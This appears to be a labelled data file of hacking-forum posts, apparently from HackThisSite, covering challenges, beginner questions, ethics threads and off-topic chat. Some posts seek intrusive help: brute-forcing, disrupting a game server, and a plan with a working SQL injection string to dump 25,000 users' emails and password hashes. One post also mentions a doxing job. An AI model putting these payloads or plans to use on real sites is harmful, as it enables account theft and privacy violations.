3	Ninjexs Realistic Mission Challenge!	hello guys, i have been putting together a realistic mission challenge today, and i hope you all enjoy it. i also hope you get stuck somewhere and facepalm a few times  here is the challenge: challenge location:  http://94.23.62.140/challenge message from: thetechguru hey man, i heard you had some excellent hacking skills in your toolbox. i could really really use your help. i was recently hired to watch over  this site  while the administrator is gone. he is on a two week vacation, that ends tomorrow. the problem is that while he was gone, the site has been defaced!!! i do not have the tools to get the site back up to its original condition. if he comes back and sees this, i am going to get terrible reviews, because of these childish hackers! can you at least get the home page (index.html) back to normal? i have done some research and it seems like the hacker deleted/removed/moved files all around. what i need you to do is figure out how the hacker managed to do this, and see if you can possibly hack it back to its original state before my boss returns! i know that the boss had a backup directory of some of the files called backup2009, can you see what you can do? thanks in advance, - thetechguru

1	Newbie Question	"i am not very savvy with computers ...and im not really looking to hack ... but, i have several questions?? i scrolled thru all 75 posts under ""general"" and read many of the posts ... but, didnt find these specific questions addressed. i am concerned that my ex knows all the usernames & some of the passwords to my email accounts ... so i have set up several new accounts on different email servers to remain unfound!!   is it possible for him to hack my new email addresses and/or usernames???  what info would be needed??  (i set some of them up using alias names and addresses, etc.)   can knowing my ip address enable him to access my new email addresses remotely from his computer??  ... and then either hack the passwords or reset them ... to gain access to my current internet correspondence??    what about finding out my usernames on social networks??   and if the answer is yes ... please explain how or what kind of software/downloads he would need?? maybe im being paranoid ... but, i just want to keep my private life ~ private!!"
1	I need help telneting a Minecraft Server	this is my first forum post. so, i found this server with asshole admins. ive been trying to telnet into the server so i can mess things up but im facing some issues. first of all, the ip is  nope . im using a mac also. the command im using is  code:  select all telnet hooyah  because port 25565 is the port that all mc servers run on. the problem is that it doesnt ask me for a username and password. this is what it gives me:  code:  select all trying nope... connected to nope. escape character is ^]. and then whenever i type something and press enter it says: code:  select all connection closed by foreign host. any ideas? sorry if its obvious; i dont know too much about this. also, once i sort this out and do get to the login section, can anybody recommend some good brute-force tools for mac? or, if this wont work, is there any other way to gain complete control over a server? i appreciate any answer
3	Is hacking a side effect of learning how to program?	do you feel that you inherently learn how to hack by learning how to program? im self-teaching myself web technologies such as html, css, python, js, etc, etc.., soon going to school for computer science. i can remember right after learning how to write forms in html, i found myself going to websites, looking at the source code for forms actions and trying to directly access it just to see what it would do     as an example.  do you feel the same way, or is it just me?
3	Identity Theft	"with millions of victims each year i am a little surprised that companies which deal with personal information from customers is not handled seriously, especially at the lower levels where there is direct interaction with consumers.  below is an experience i had a while back and the actions i took to help mitigate the problem at a local rental store of a national company. i did a short term 6-month contract with a company several states away and rented an unfurnished apartment.  i went to a store to rent some furniture for my stay and while filling out the paper work i noticed that they had a box for your social security number.  i asked if this was mandatory and the person at the counter said yes.  i inquired if they need to run a credit check and they answered that no credit check is performed, but they use the social security number as a ""file number"".  i pressed the issue a little more and the manager came out to explain they only use the social when they have to send a report to the credit bureaus for people that fail to pay. that seemed to be somewhat reasonable in dealing with people that blatantly dont want to pay for things.  i inquired further about what they do with applications that dont get approved and how the ones that are approved are kept on file are stored and disposed of.  the manager didnt like the questions and told me its none of my concern.  when my application gets tossed in the trash and someone picks it up and sees all my personal info it is my concern.  its a big key to anyones financial ability. i called the hq of the company and after a few days i was able to speak with someone that seemed fairly knowledgeable and informed me that applications are supposed to be shredded when no longer used. i attempted to obtain permission from the person to perform a test to validate the process but they were unable to give me the approval to do so.  i then proceeded to speak with the local law enforcement about my concern and what i wanted to do in order to confirm the local staff was adhering to company policy but they gave me the run around and told me to talk to the company about that.  sad to say, it was an anti-climatic end and i never was able to determine how the shop handled the proper care of sensitive customer information.   so what are peoples thoughts on the issue of identity theft?   should store employees be held accountable, the personnel at hq, or both?  do you think careless attitude in handling personal information come from a lack of knowledge or the idea that it ""cant happen in my town"" / ""thats only a problem in big cities"".  i welcome all opinions and criticism."
3	trapping for predators in CT	"far off topic from computers,but i was just watching the local news today and walked away very annoyed! i am very big into hunting and would like to hear what some of you guys + girls have to say about what ct is trying to do about putting an end to certain types of traps.  first off,in order to trap in ct (state land or private land) you need to go through a safety course to become  familiar with the rules/laws and season times to trap/hunt.this is also the case with rifle hunting,bow hunting, & black powder hunting.therefore,most hunters/trappers are out in the woods doing the the right thing.i say most because you do read about some idiots in the paper.for instance,how some kid shot a bear with a .22 cal. pistol because he thought it would be funny and ended up getting eaten because all he did was piss off the bear!  ct is trying to eliminate a particular type of trap (the leg hold trap) in order to ""protect"" animals the trap was not intended for. in this case an owl somehow found its way to a leg hold trap and got stuck in it.the owl lost its leg. obviously the trap was intended for a rabbit,coyote,fox,beaver,fisher cat or what have you to be snared,not an owl. but we also do not live in a perfect world. some owls are retarted and want to see what it is like to be a coyote walking through a trap.(just kidding)i am guessing the the owl was trying to prey on something that was already in the trap,and somehow got itself stuck.shit happens!  ct dep (department of environmental  protection)is also against changing the laws.  eliminating this trap would mean coyotes and foxes would become out of control and begin to destroy livestock on farmland,and or attack home pets(dogs and cats) or even people.beavers will dam up streams and create floods in urban neighborhoods.thats just a few things that would/could happen.  i think it is obvious to say where i stand on this topic. what is your opinion?"
1	Brute force attack	hey guys! i know i signed up a while ago but im still pretty new at this stuff. learned lots already! one thing ive been trying to wrap my head around all day is brute force attacking. ive looked every where on the internet for a good program but i cant find any! main reason: i need to recover an xat ownership password if that helps you understand what type of program im looking for, since the xat owner password is found in the url. and its been driven meh nutz! can you help out? thanks, baron -- fri mar 27, 2009 12:10 pm -- and in case youre wondering yes it was my xat. i deleted all my account info that was in my mail...   -- fri mar 27, 2009 2:59 pm -- oh and it looks like im going to need some brute force soft ware for realistic mission 5....

1	VMware Networking Issue	hey everybody, im not that familiar with vmware but i know how to set up bridged networks on my machine and all the basics. first, if i have one of the connections assigned as nat the network connection is showed as unidentified network in the network and sharing center through the control panel on my windows vista machine. so when i set up lets say vmnet0 (in virtual network editor) to a bridged connection and i change it from automated bridge to nvidia nforce 10/100 mbps ethernet (my ethernet adapter) and select apply it doesnt show up with the nat connection in control panel. so, i cant seem to bridge my local network with the bridged connection set up with the virtual network editor because its not there to bridge. ive tried to do the same procedure with the nat connection and then changing it to bridged after i have bridged those to connections together in control panel. restarted the computer and everything, reset the comcast high speed internet modem but it still show that the network/connection was unidentified and of course showed limited connectivity. i dont have any firewalls set up at the moment no router, my av is avira and i have spyware doctor running. ive also tried the same thing while my av and the doctor wasnt running but no success. p.s. if you want to know why i am trying to bridge them together, is so i can connect to an ssh set up service on a linux virtual machine so i can connect to it remotely. if you guys need any more information in case i have missed something please tell me and i will provide it. also if i have posted it in the wrong section, im sorry.  thank you, r0y4lty.

3	Any fellow tobacco enthusiast?	i know its not a common hacker hobby, but when i have a problem to solve, i love to think it over a nice pipe smoking or cigar session. just thought id see if i have any fellow smokers who enjoy this pastime and what they think of smoking and hacking. not that the two go technically together or anything. also if so favorite tobaccos and cigars would be a welcome bit of information. i just enjoyed a tatuaje cigar and also bought some mcclellands black shag to add to my pipe tobacco collection. loving both so far. so anyone?

3	HTS weekly challenge #1	hello everyone! tonight, i provide a simple challenge in hopes of getting as many people to participate as possible. try your hand at it and post your results when youre done (please avoid spoiling it for others). using pre-existing tools is a valid technique, however i recommend everyone write your own code to get some practice. challenge: so, being the l33t h@x0r that you are, youve successfully pwnd a website and dumped the database. but now you have a problem, the passwords are hashed. your challenge is to figure out how the hash was generated, and recover the passwords for over 9000 internet points. thinking ahead, youve created a test account with a password of password which gave it a hash of 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8, figure out the rest: code:  select all ef797c8118f02dfb649607dd5d3f8c7623048c9c063d532cc95c5ed7a898a64f d9184e01fe90fa4abb7b9e36f1758732378c5fbf722bfe9f57f14d2ab8f014b5 0e93defd522a6c0f64c1c6bae83dda4bdcebad0994ea793da12aa0a82d0aa610 another site you hacked seems to be using some wierd format. again, you create a test account with a password of password, giving you a hash of 5544c564:51069b6bb4593f5d8d9029f1ad076451ceea7b2b5ceb6303204888159661c93b. good luck! code:  select all 66c288aa:667c767e55482fee3c85d246a9f3611145c5c511a18392ff0a1a00624c8eb74c 8ce4f561:fe3181f192d6451349d287b745f005f0fd0d749b26e96975f79d8dcc1a7b48fc de1abbdb:6bd1933bfc0559d239c9ee11f8d5d863abdbdd95d348440d2118285c797d0ef6 now youve got lots of passwords, but none of your wordlists seem to work on the admins hash. a little research shows he has a dog that hes very affectionate about. code:  select all 2b625d5d:6b4fe63316a17f887493c3f9717896b75f4455f238bfcd68d4466249f588ee02 <3
1	Web exploitation problem	"im trying to exploit based on a hackathon that goes all year called pico ctf. i want to be able to find what the hidden key is. could someone please explain the code a little bit? code:  select all             var key; // global variable.                           // since the key is generated when the page              // is loaded, no one will be able to steal it             // by looking at the source! this must be secure!             function generatekey() {                 var i = 1;                 var x = 37;                 var n = 5493;                 while (i <= 25) {                     x = (x * i) % n;                     i++;                 }                 key = ""flag_"" + math.abs(x);             }                          generatekey();                          // encode the message using the key             function encode() {                                                                         var input = $(""#inputmessage"").val();                 var output = cryptojs.aes.encrypt(input, key);                 $(""#outputmessage"").val(output);             }"
1	Safe Browsing?	sometimes i use google search and i find a site i want to visit. but i am suspicious that it may contain a browser exploit, or it one of those annoying sites that some how intercept you search string and put on a sponsored link  or the site is a display for a internal search for x which you searched on google. so i dont want to take the risk or waste time trying to connect to the actual site. so i click view cached copy. i find this is slightly faster ( might be a placebo  effect though). basically it loads a cached version of that site stored by google  they must have one huge hard-drive. anyway i was wondering is it still possible for the cached version of the site to run a browser exploit? i have checked some cached websites out and the links on the site lead you to the original version
1	SQL injection	hi all i am the owner of a mmorpg game and have been working on this site for a while now. just a few days ago, someone had managed to sql inject the site and had managed to get the passwords my passwords are encrypted so they couldnt do much however they then managed to change all the passwords on the user table for all the accounts? i was hoping to find some people to help me find these vulns and try to fix them. unfortunately i am no expert and have had no luck in finding the bug / bugs in the game. i have tried to make the game as secure as i can however i do not want to advertise it too much for it to get hacked again. i can prove that i am the owner of the website and i am not trying to hack someone elses site. if you want proof let me know if skype is easier to talk ashhbfdd my website is called  http://thugpara.com could use account below user = demo  pass = a http://www.thugpara.com/edit_profile.php maybe? also  http://thugpara.com/hts/ will prove it is my site. thanks
1	scripting at work	i have a job where i need to do a far bit of pretty repetitive and monotonous spreadsheet editing and website administration. im probably playing with fire but i told my boss that since my background is in software development(not what im being hired to do) i would be able to automate much of the crap i otherwise waste my time on. the man doesnt argue with results so hes given me the go ahead to pretty much do what i need to do within reason. my issue is one that ive had with the work force since day one. those in charge expect you to look busy(real sticking point for me lol) and be able to justify the time you spend(like youre being hired for your hours, not your results which is so fucking backward but i digress). im hired as a sales person so im not going to get away with installing visual studio and spending 3 hours a day eating chips and hammering the compile button like i do at home   so past the wall of text and to my question. on a basic windows 7 set up. what coding options do i have at my disposal that wont raise eyebrows? what i want to do is work with text formatting(for excell)  i also want to be able to make web requests, pull information and specifically pictures. its kinda annoying that i know what im capable of with my linux box but when there is actual money to be saved, ive got an archaic windows machine with 2 gigs of ram to work with lol management     i know i have batch , vb seems like the choice with ms office, does this mean my system comes with a vb sdk?. i havent touched these languages in years. i would already be playing with this but i dont get a lot of time to work on it so i am hessitant to  jump into a lauguage im not familiar with. ive done web crawlers with python but im not sure how easy it is to set it up. java should be easy but fileoutputstream, outputstream, printwriter, bufferedfileprintwriter, hyperduplexbufferedoutputstream and the others i could make up have kinda left a bad taste in my mouth for small projects    i really want a higher level language than c/c++/java that i can prototype for a few minutes at a time, when its quit so yeah, what do you guys reccomend i work with? summarizing. i want to be able to process strings easily and be able to make web requests basically out of the box. cheers
1	automated sql injection with php?	"ok, i havent programmed in php in years and im trying to write a script that will let me automate some sql injection on my own forum for fun. the url looks like this ""null union select concat(user_id, ,user_email, ,user_password) from phpbb_users where user_id=20444#"" and it returns a big html page with the email and password.  i want to do a for() type thing from 1-25000 and fetch all the usernames and passwords. this is what the html looks like: code:  select all <div class=""head"" >                      <h2 style=""float:right"">                         <span><em>20444 anonymouscoward@gmail.com 5f9901fc60b769b523d0dd8e79b3fe08</em></span>                      </h2>                      <h1 style=""float:left"">                         <span>send message</span>                      </h1>                   </div> so, as you guys can probably tell i want to be able to pull out the email ""anonymouscoward@gmail.com"" and the md5 password ""5f9901fc60b769b523d0dd8e79b3fe08"".  i want to do this 25000 times for each separate email. how would i get started on this project?  how difficult will this be?  what functions do i need to be looking at?"
1	Ashley Madison Hack	"im putting this here under ethics...  if you werent aware then youre living under a rock... the (in)famous website ashleymadison.com was hacked by a group calling itself impact team.  this may be the most devastating hack in terms of real world repurcussions in the history of hacks.  this dwarfs in comparison to millions of stolen credit cards that can be replaced. families will be destroyed, jobs will be lost, people will be blackmailed and extorted, there will be suicides, and there may be murders (more about that at the end of my post). simply put.. discuss.  there is a lot of meat here. the ethics of the site and the company itself and its poor model, lax security and the fact that it did very little to protect its users... the ethics of the hackers, of which rumored that perhaps a disgruntled ex-employee(s) are part..  the ethics of the hacked... which many on the web are saying they deserved it, karma is a bitch.. holier than thou yada yada... id love to grab the data dump to pour through it but i dont have the bandwidth for 10gb with my current shoddy internet at home and i dont dare use work lol.....   i know im on there ... i had an account for the purposes of a doxing job... i should have thought better of it and not used my actual billing information and cc.  so now i worry about when my data gets found by anyone...   but i worry more for the woman i was doxing. in the end i told the private eye i was contracting to that i found nothing on her...  and had determined that her husband who contracted the work was the worlds biggest douchebag..  rich, powerful, cheating on her all the time.. probably looking for a reason to get rid of her without alimony... he was also obviously abusive.. id love for this guy to get run over by a truck.. shes a legit good person - and yes, a cheating spouse..  and im now afraid for her life.   my opinion on this.  the operators of ashleymadison are scum, but the hackers in the case are also scum, they are only using ""morality"" as a smokescreen for their hack.  im sure many users are scum too, and while i think its ok for hackers to leverage some moral authority against governments and corporations...  this was an attack on average people and i think it was just wrong. youre turn.. discuss..  this topic could go all over the place, interested to see your thoughts. side note - anyone who can grab that data dump pm me.. i have a few names to check on to see if i can assist in damage control (i know a few people on there and im getting requests for my skills already)..   does that make me scum now too or companies who will try to profit off helping victims?"
1	URGENT: Im getting this problem AGAIN!!!	so, i have this virtual machine software and im getting the same problem i got earlier. the problem is, earlier i was unable to fix the problem until i refreshed my whole computer. i need another solution so that i dont have to do that again!!! here is the error i get when trying to open kali, or any other virtual machine. it didnt do this before: and it also gives me this: why is it doing this a second time!!?? help!!!?? best, ghostheadx2 ps, my name isnt ryan hunt. thats a fake name. pss, its doing it a third fucking time!!!
1	Why wont Reaver work? Is this a Kali System Error?	so, i found a few links to convey my problem: https://forums.kali.org/showthread.php? ... 99-problem and if you look at this second link, its no where near the whole article, but it shows that reaver isnt installed: http://www.kalitutorials.net/2014/04/ha ... linux.html and i think not having reaver working on a vm is causing me all sorts of issues. i want to learn to crack wifi and yet i cant use reaver properly. let me show you what i mean. i cant use reaver yet because im still trying to get the prereqs down, but these prereqs to reaver arent working at all. so then, how do i make reaver and its prereqs work with a ralink adapter. heres what happens when i actually try and make reaver work: update: ive had problems with various programs, including wifite, reaver, and metasploit, and i think it may be all because of one major issue that causes all of these. is that even remotely possible? if so, is it possible or even probable that it is a kali system error as asked earlier? thanks so much. ive tried several kali programs and i think it may be the reason none of the exploits earlier in metasploit worked, as posted earlier: viewtopic.php?f=37&t=12942 viewtopic.php?f=37&t=12929 why would wifite not ever crack a single key as posted earlier? i doubt its because im bad at this stuff because im following tutorials exactly. i should have gotten one or two keys right? examples of wifite problems i posted earlier: viewtopic.php?f=37&t=12967&hilit=+wifite i believe all of these problems are quite possibly a related kali system error, but i have no clue how to implement anything that might fix anything. i am thinking i might just be bad at this at this point, but that cant be the entire story because a lot of these were following tutorials directly from websites, so id imagine at least one of these would have worked by now even if i sucked ass at hacking. i mean even the worst hacker (i know im kind of a beginner) or the most inexperienced should get something right from a tutorial. i dont get it. is there an administrator privilege problem over the vm? is it because its not the main system i have installed?
1	what basic knowledge should I have before retrying hacking?	so, my friend whos a lot more advanced than me said i need to learn the basics of a few different things: linux, windows, networking, etc. before i start trying to hack systems. im wondering how much prerequisite knowledge i need and about what? i know linux is one of them but what else should i learn before trying penetration testing again? he gave me examples, like knowing where passwords are stored, etc. before i go back to trying to learn hacking. so what general areas do i need to learn the basics of before i start trying to hack? obviously, i dont need to be advanced at any of these things but what are the main areas i need to learn? i have another thread where i talk about learning linux and saw this popping up so i decided it should be in a separate thread since its a different conversation. forgive me if thats actually double posting. it was very briefly mentioned.
1	getting past wifi 403 forbidden error at a cafe	"if i knew enough about wifi, could i hack the wifi system, perhaps in the wifi router or whatever is being used, and bypass the 403 forbidden error at a cafe perhaps? if this is possible, what do i need to study to attempt to implement it? ive tried proxy servers and proxy settings in firefox, tor, vpn, and two of those three things work in a pretty similar fashion, so obviously proxy web sites dont work and trying trick requests to try and trick the server dont work. i found a linux tutorial that requires me to set up a separate server that id either ssl or ssh into and connect from there remotely. but i dont have a separate server. so, my question is, what is the prerequisite knowledge to figure out how to know what im doing trying to get past this, and is this a realistic long-term goal? i am fine using hackforums.net at home and at my dorms and limiting it to that. however, im curious on the science as to how to turn off or trick the router (or whatever wifi system is being used) into letting me turn off whatever feature is implementing the 403 forbidden error. i know this probably sounds a lot like other people saying ""how do i hack wifi?"" what im asking is what is the prerequisite knowledge needed to attempt to get around it because people say anything can ultimately be hacked and it is possible. should i learn tcp/ip and then cisco training? what type of stuff should i learn beyond that. im guessing its very advanced to be able to understand how to figure that out, or at least have a good attempt because i know it is possible. i usually use a personal hotspot, so this isnt an issue. im wondering what the prerequisite knowledge needed would be."
1	My endeavor to reverse engineer an Android app	"ever have repetitious things that take up too much of your time, like those stupid games on your phone that you can stop playing, so you start thinking ""how can i automate this?"" so im playing this multiplayer android game and wanted to create a script to automate some of the processes. the first thing i did was to look at the traffic that was being sent to the server. using a pc app emulator and wireshark, i was able to see that it was sending http request to different php files depending on the action that was selected on the app. along with the requests were a couple of encoded authentication arguments. you guessed it: ?user=&pass=. great, so i copied the http request from wireshark and add it to a script that sends the request to see what gets returned. 10. ??? thats it, just the number 10. thats not what i was expecting. i did notice in wireshark that some of the encoded arguments were the same and some were different. so i grabbed a different one and tested it. same thing, just a 10. i looked at how often the arguments changed, and it seemed to be pretty often. this time i quickly clicked an action in the app emulator, grabbed the request from wireshark and ran it through the script. bam! theres the json string with all the data i was looking for. but that same request wouldn’t work a few minutes later. so by now your saying ""dude you’re an idiot, this is not reverse engineer."" hold on, hold on, im getting to that. at this point, running the app, copying the request, and adding it to the script isnt so automated. i need to find out how the arguments get encoded. to do that i want to see some source code. this being my first time breaking into an app, i need to do some research. i came across a great tool called dex2jar, that takes an android application package or apk and decompiles it to its java source. using another tool called jd-gui i was able to open the now jar file and look through the code. wow, not a whole lot of help with descriptive method names or variable names. if youve ever decompiled anything, you know that variable like loggedin=no become a=no. after scanning through all the java class file, i finally find one that returns a string with ""?user=a1&pass=a2."" yay!... now what? i know a few programming languages but java is not one i know very well. try to re-code this java class into a script? what happens if this class gets updated... = broken script and re-coding. theres got to be a better away. after many puzzling hours my progress has come to a halt. if i could just figure out how to compile that one class into a working executable java file, i could create a script that executes it with parameters and receives the encoded results to pass along to the server. this is where you come in. are you good with java? have you reverse engineer software before? i figure a community like this could might enjoy helping with a small project like this. what do ya think?"
0	My Recommendation for Any Complete Linux Beginner	ok, i know this is going to sound really dumb but here it goes. i have two recommendations as someone whos sort of a beginner in linux. even though im not in any way advanced, i wanted to recommend a book and a tutorial site. so, youve all heard me ask questions about the linux command line book by no starch press. i just wanted to recommend the book to any beginner in linux. i havent even finished the book but i learned a lot from it even though i didnt retain most of the information. i know that sounds contradictory but my point is it really exposes you to basic command line concepts and a lot of more advanced commands i feel i will probably just relearn later. also, i think that since comptia linux+ is what cybrary uses, that i can conclude (maybe im wrong), that lpic-1 is an excellent place to start learning linux imo. i say that because as someone who doesnt know a lot about linux, i feel like it helped expose me to what a basic linux system feels like. i dont feel like an expert, but i feel qualified to decide i like linux, even though i like networking a lot more, and that linux is definitely work learning. the first video in the linux+ series on cybrary does sound boring at first because of the guys voice, but it stops being boring once you start learning the material. the material is very interesting throughout the series, but the whole thing is also very well structured. anyways, thats my two cents on a book and a tutorial series im maybe half way through either. im in finals right now so i havent had time to past couple of days to focus on this stuff, but i just wanted to let everyone know i really appreciate those two books as beginning learning sources and they have helped me a lot.
1	social engineering and encryption missions anyone?	"so, we have various missions in different categories. i think we should have more categories, so i thought id make some suggestions. i think firstly we should have encryption missions. that is, missions where you have to do something from a previous mission, but without setting off the security system. i also think we should have social engineering missions where you have to type in a message and see if someone responds the right way to make sure the person got the social engineering technique right. i think seing missions are hard to do because we need a system that responds to how someone phrases their sentences, but ive heard of social engineering penetration testing before so a virtual environment for seing might not be all that bad. but id really like to see encryption missions, although i am not savvy enough to make one myself. like a category of mission that takes from previous categories and redoes an older mission, but if you set off the security system it will tell you something like ""congratz! you just put yourself in jail!"" wouldnt that be cool?! i mean, isnt understanding how hackers cover their tracks part of the pen-testing and security process?"
3	New Noob advice	"hi guys n girls im new and i mean like new just out of the wrapper and keen to get into hacking. i generally when i return home from work turn my pc on and it doesnt turn off until i go to work again and was nervous about hacking but once i found this site and read more about hacking i cant get it out of my head so im jumping in both feet at a time. i installed kali-linux and run it on vmware and im reading ""the hacker playbook 2"" and while following the guides on updating kali i do have problems from time to time including updating the headers. another one while following the book it has additional applications to download from gifthub and while i follow what it tells me i dont seem to be able to install them apps i see the install file in my downloads folder in my vm but im clueless on how to install it. sorry guys for the noobish. like i say im keen as heck and i have such a short attention span while reading but i can stop reading up this stuff and although i could read the whole book first it like to follow it practically as its teaching me. also io noticed on another post sites that were recommended were: http://www.w3schools.com/ http://perl-tutorial.org/ https://en.wikipedia.org/wiki/server_side_includes https://en.wikipedia.org/wiki/cryptogra ... h_function https://www.hackthissite.org/articles/read/1038 should i read the whole book while trying to apply the training practically or does any of you guys have better advice for me. one final question if i havent sent you to sleep or annoyed you that much i will get hacked lol how long should it take for me to reach a basic level of hacking in months terms. thanks guys for reading and i hope for any sort of advice and guidance as id rather learn from people with experience that run around forums for months. point to note on my noobish moments ago i passed basic 1 mission and i smiled so big when i got it"
1	Would Love Some Help	hey yall. im a fairly young person, and im trying to learn some hacking because i find it very interesting and useful. i have always been generally, to put it frankly, not devoted to anything and i possess no special skills. cybersecurity is a field that just keeps growing and growing, so i decided to learn html and dive in. thing is, i really do need a person to explain things to me sometimes. i have trouble learning on my own. i know how to complete three basic missions with my pretty bare html knowledge, but heres the thing. i want to know why things work why they do, what makes it all go together perfectly, etc. i really need someone to explain things to me because im failing to help myself. please no hate. i am a noob and i realize im not gonna get very far without some help. would really appreciate some honest help and some nice, patient people   thanks.
0	Who Wants To Learn How To Program?	"hi all, it has been a while because my last company blocked me from getting into hackthissite and all of the proxies i could find were sub-par, so i didnt bother to really try. anyway it looks like people have been busy reading this thread and im glad. i would love to help anybody at any time to learn how to program. recently my coworker and supervisor indicated that he thought there was a bit of a shift happening in the programming industry on how to teach and learn programming - moving further away from ""how to program"" and closer towards ""how to program correct programs."" the objective in defining what a correct program is is to utilize proven methods of solving problems. generally these proven problem-solving methods are called design patterns. most commonly, design patterns are applied to object-oriented problems. however some design patterns are geared specifically toward functional programming (btw those are the two most common programming paradigms: functional and object-oriented... procedural  could arguably be a synonym for  functional , structured programming is a sub-paradigm of imperative programming - also a programming paradigm. most programmers use multiple paradigms while programming, because one is not necessarily more effective than another at solving a problem and not all problems lend themselves well to a single programming paradigm.) here are some examples of design patterns (taken from wikipedia): some popular object-oriented design patterns builder object pool singleton (a special type of object pool) decorator some popular functional design patterns event recursion pipes and filters bridge many of these design patterns are simply more popular in one paradigm over another. for example pipes and filters and bridge can be used in oop, while decorator can be used in functional programming. these are just some examples. while many design patterns can be used in multiple paradigms it may be simpler to implement a design pattern a certain way that involves a specific paradigm over another. recursion is however an example of a multi-paradigm design pattern that is generally implemented in the same fashion in both paradigms. since i have been studying design patterns, i have often asked myself why dont schools teach design patterns first. and i remember that i used to hate programming theory, not understanding the purpose behind learning about how a bunch of really old guys programming patterns would help me to learn how to program. but now more than ever i understand that programming theory (like design patterns) is a foundation for computer science. it includes proofs, mathematics, discrete math, computer architecture and organization, o-notation, and design patterns. one very simple and basic design pattern, and yet one of the most important and highly used design patterns, is the interface design pattern. if you are using c# or java then interfaces are part of the programming language. recently i dug a little deeper into what interfaces really were.  the simple definition of an interface (generically in computer science) is: a contract defining that any class that implements an interface must implement all the method definitions given in the interface. ( the code project - the interface construct in c# ) as i said c# and java define the interface pattern explicitly. here are some example interfaces in c# and java (they should look very similar): given the enumerated type weapontype: (language-independent) code:  select all weapontype = firearm | melee | missile; (java) code:  select all package com.nathandelane.interfaces; public interface iweapon {    string getname();    double getweight();    weapontype getweapontype();    long getdamageincurance(); } (c#) code:  select all public namespace nathandelane.interfaces {    public interface iweapon    {       string getname();       double getweight();       weapontype getweapontype();       long getdamageincurance();    } } (note that methods of an interface in c# and java are inherently public and it is a syntax error to include an access modifier in a method declaration in an interface.) in these languages and some modern dynamic languages like ruby interfaces are trivial, and simple to implement. once i realized that, i wondered how one does it in c++. i read a lot of information and learned that at some point microsoft added a __interface keyword that can be used similarly to the c# and java variants, but that wasnt exactly what i wanted, so i consulted with  bjarne stroustrup , the inventor of c++ to see what he said, and i learned that an interface is really just a completely abstract or (in c++) virtual class. the class itself is not what is virtual but all of its members are. they must also be public. anyway this is the basic result: code:  select all #include <string> class iweapon { public:    virtual std::string getname() = 0; // the = 0 makes this a pure virtual function.    virtual double getweight() = 0;    virtual weapontype getweapontype() = 0;    virtual long getdamageincurance() = 0; }; this pattern is more similar to a  abstract  class in high-level strongly-typed languages like c# and java. an abstract class is also, by definition, and interface, however an abstract class may define some methods and leave other methods virtual or abstract. abstract classes may also define a constructor and fields, though typically the constructor or constructors are protected a little more by giving it  protected  access. here are some examples in java and c#: (java) code:  select all package com.nathandelane.interfaces; abstract class abstractweapon {    private string name;    private double weight;    private weapontype type;    private long damageincurance;    protected abstractweapon(string name, double weight, weapontype type, long damageincurance)    {       this.name = name;       this.weight = weight;       this.type = type;       this.damageincurance = damageincurance;    }    abstract string getname(); // note that these methods can also have a body.    abstract double getweight();    abstract weapontype getweapontype();    abstract long getdamageincurance(); } (c#) code:  select all public namespace nathandelane.interfaces {    public abstract class abstractweapon    {       private string _name;       private double _weight;       private weapontype _type;       private long _damageincurance;       protected abstractweapon(string name, double weight, weapontype type, long damageincurance)       {          _name = name;          _weight = weight;          _type = type;          _damageincurance = damageincurance;       }       public virtual string getname(); // now this method doesnt need to be overridden because it is virtual.       public abstract double getweight(); // note that these methods can also have a body.       public abstract weapontype getweapontype();       public abstract long getdamageincurance(); } so there are a couple of different rules in c#. it has both virtual and abstract keywords. a virtual function and an abstract function are both by definition virtual or abstract, but the  virtual  keyword makes it so that the implementing class is not required to override the method. an abstract method must be overridden by an implementing class. also both abstract (and virtual methods in c#) may have a body in an  abstract  class in c# or java. sometimes you will see that the default body throws an exception, such as a new notimplementedexception, in case somebody tries to use the method before it is implemented. anyway, besides practicing programming now, i am suggesting more and more understanding why, when, and how to correctly implement design patterns. if anybody wants to pick my brain a little more on design patterns or any of the other ideas i mentioned in this post, feel free to contact me. i should be more available these days. thanks. nathandelane"
1	Helping the HTS Community	im not entirely sure the best way to phrase anything here, so im going to stream-of-consciousness this thing and hope it all works out.  right now hts is switching to open source, and people are debating here and there about different reforms that should or should not be happening. its pretty obvious that the important thing here is for the members of this community come together to works towards the common goal of bettering ourselves and this site - great! i really want to help out with things - i love this site and the community, and ive been actively reading in the forums for about year now - but i dont really know a whole lot about computers still (not that im complaining or looking for an easy way, of course). im literally in the middle of my first programming class, still learning concepts in alice rather than actually working with syntax. so i would be little to no help with looking at the source and trying to debug. and while i am learning a lot from the forums and the site resources, im still not at a point where id be able to help people with specific problems. (i know that sounds complainy, but i promise its really not). i guess what my question is... while im learning, what can i do in the mean time that would benefit hack this site?

2	Backtrace Security Leak	"this might come as news to some, old news (day or so) to others.   synopsis of situation is as follows: backtrace security has threatened to release data of an incriminating nature (as yet unknown) on members of the group anonymous. more info: http://blogs.forbes.com/andygreenberg/2011/03/18/ex-anonymous-hackers-plan-to-out-groups-members/ fighting words: but he and others with backtrace gained access to anonymous hackers’ information by infiltrating the group with false identities and other “social engineering” tricks that he says fooled members into revealing themselves. “the whole point of this is that we didn’t break any laws,” hubris says. “all we did was hack peoples’ minds, because they’re fucking retarded.” [...] hubris says he’s confident backtrace won’t face the same fate. he calls the anonymous hackers “script kiddies” and downplays their skills, arguing that the hbgary hack was based merely on the company’s reusing passwords and falling victim to social engineering. ”if you do enough damage to someone, you don’t have to fear retaliation.” says hubris. “once the world sees who these kids are and what they stand for, no one will follow them.” their official site is  here .  a mirror of their ""insurance"" file, an allusion to the file of the same name provided in an encrypted format by wikileaks, can be found  here id bet, if this file is to be released, that this might be fun reading material.  for lulz sake, stay tuned."
3	April Fools	"l.s, first of all, im to be classified as your stereotypical noob who knows some html and javascript, but not very much. my only programming experiences have been with a casio calculator, you know, the basic ""if"" - commands, adding values to variables etc. ive also done some basic missions on this site and some realistic missions as well, with a little help of google. now, a very goofd friend of mine has created a blog website recently. now i have to say, i kinda doubt his site has a very high security, or it should at least contain some bugs. when i told him this, he was highly convinced of the fact it didnt.  so, considering which day it is tomorrow, i thought of pulling a little prank on him by ""cracking his site"". of course, i know this isnt as easy as it sounds, and i have no intentions of doing any harm. i just wanted to post a picture, which said something like ""xxx was here, check your security! april fools!"" to his site, or perhaps change the index file to mine (basically a clone of the site but then with the picture added) and then remove it later on and change everything back the way it was.  i am not going to ask anyone to support me in doing so, and i dont even know how to, but it made me wonder -  ***is such a thing even possible? ***    ***does anyone know a good place to start off, like, changing values of a site, manipulating the data transfers in a way and maybe learning a certain programming language which enables me to do so?*** ive taken a look at the source code and the login system (maybe log in as admin) and ive tried several things 